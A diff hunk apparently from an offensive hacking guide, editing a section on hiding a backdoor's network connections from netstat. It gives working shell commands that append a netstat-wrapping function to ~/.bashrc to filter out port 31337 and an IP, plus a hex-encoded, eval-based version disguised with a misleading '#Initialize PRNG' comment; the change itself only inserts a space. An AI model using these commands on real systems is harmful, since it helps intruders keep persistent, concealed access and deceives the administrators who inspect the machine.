@@ -164,12 +164,12 @@ echo 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }' >>~/.b
 Or cut & paste this do the same but obfuscated in ~/.bashrc:
 ```shell
 X='netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }'
-echo "eval \$(echo $(echo "$X" | xxd -ps -c1024)|xxd -r -ps)#Initialize PRNG" >>~/.bashrc
+echo "eval \$(echo $(echo "$X" | xxd -ps -c1024)|xxd -r -ps) #Initialize PRNG" >>~/.bashrc
 ```
 
 The added entry to ~/.bashrc will look like this:
 ```
-eval $(echo 6e65747374617428297b20636f6d6d616e64206e6574737461742022244022207c2067726570202d4676202d65203a3331333337202d6520312e322e332e343b207d0a|xxd -r -ps)#Initialize PRNG
+eval $(echo 6e65747374617428297b20636f6d6d616e64206e6574737461742022244022207c2067726570202d4676202d65203a3331333337202d6520312e322e332e343b207d0a|xxd -r -ps) #Initialize PRNG
 ```
 
 **Method 2 - Hijacking with a binary in PATH**
